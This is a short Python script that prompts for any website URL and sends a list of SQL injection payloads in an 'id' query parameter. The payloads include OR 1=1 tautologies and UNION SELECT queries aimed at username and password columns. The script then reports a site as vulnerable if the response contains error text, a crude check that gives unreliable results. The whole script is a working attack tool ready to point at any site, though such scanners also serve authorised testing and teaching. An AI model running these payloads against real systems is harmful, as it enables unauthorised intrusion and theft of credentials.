import requests

def test_sql_injection(url):
    # List of SQL injection payloads to test
    payloads = [
        "' OR 1=1 --",
        "' OR 'a'='a",
        '" OR 1=1 --',
        '" OR "a"="a',
        "' UNION SELECT null, username, password --",
        '" UNION SELECT null, username, password --'
    ]

    print(f"Testing URL: {url}")
    for payload in payloads:
        print(f"Testing with payload: {payload}")
        test_url = f"{url}?id={payload}"

        try:
            # Send the request
            response = requests.get(test_url)

            # Check if SQL injection vulnerability is present
            if "error" in response.text.lower() or "Warning" in response.text:
                print(f"SQL Injection vulnerability detected at {test_url}")
            else:
                print(f"No vulnerability detected at {test_url}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

if __name__ == "__main__":
    # URL of the target website to test
    target_url = input("Enter the URL of the website to test for SQL injection: ")
    test_sql_injection(target_url)

